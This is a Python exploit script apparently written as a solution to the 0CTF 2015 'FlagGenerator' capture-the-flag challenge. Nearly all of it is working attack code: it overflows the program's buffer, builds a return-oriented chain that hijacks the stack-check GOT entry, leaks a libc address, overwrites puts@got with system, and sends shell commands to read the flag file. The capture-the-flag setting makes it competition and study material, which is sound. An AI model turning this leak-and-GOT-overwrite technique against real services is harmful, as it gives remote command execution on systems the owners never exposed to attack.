# 0CTF 2015 FlagGenerator [250pts]
import socket
import struct
import telnetlib
 
p  = lambda x : struct.pack("<I", x)
up = lambda x : struct.unpack("<I", x)[0]
 
def ConnectTo(SOCK_TARGET):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(SOCK_TARGET)
    teln = telnetlib.Telnet()
    teln.sock = sock
 
    return sock, teln
 
def PwnFlagen(TARGET_SOCK):
    s, t = TARGET_SOCK
 
    stack_chk_fail  = 0x0804B01C
    puts_plt        = 0x08048510
    puts_got        = 0x0804B010
    uRead_func      = 0x080486CB
    read_got        = 0x0804B00C
    pop4ret         = 0x08048D8C
    BSS             = 0x0804b060
    offset          = 0x0009B340 
                    # read@libc - system@libc
 
    print t.read_until("choice: ")
    s.send("1\n")
 
    payload  = p(puts_plt)
 
    H_n = ((272 - len(payload)) / 3)
    D_n = ((272 - len(payload)) % 3)
 
    payload += "H" * (H_n)
    payload += "D" * (D_n)
    payload += p(pop4ret + 3)
    payload += p(stack_chk_fail)
 
    payload += p(puts_plt)
    payload += p(pop4ret + 3)
    payload += p(read_got)
    # puts(read@got);
 
    payload += p(uRead_func)
    payload += p(pop4ret + 2)
    payload += p(puts_got)
    payload += p(0x12345678)
    # uRead_Func(puts@got, 0x12345678);
 
    payload += p(uRead_func)
    payload += p(pop4ret + 2)
    payload += p(BSS)
    payload += p(0x12345678)
    # uRead_Func(.bss, 0x12345678);
 
    payload += p(puts_plt)
    payload += "EXIT"
    payload += p(BSS)
    # system("id ; cat /home/flagen/flag");
 
    s.send(payload + "\n")
    print t.read_until("choice: ")
 
    s.send("4\n")
    print s.recv(4096)
 
    read_libc   = up(s.recv(1024)[1:5])
    system_libc = read_libc - offset 
 
    print "[*] read@libc   : " + hex(read_libc)
    print "[*] system_libc : " + hex(system_libc)
 
    s.send(p(system_libc) + "\n")
    s.send("id ; cat /home/flagen/flag\n")
 
    print "[*] " + s.recv(1024),
    print "[*] " + s.recv(1024)
 
if __name__ == "__main__":
    # socat TCP-LISTEN:9985,reuseaddr,fork EXEC:"strace -i ./flagen"
    TARGET  = ("192.168.1.174", 9985)
    PwnFlagen(ConnectTo(TARGET))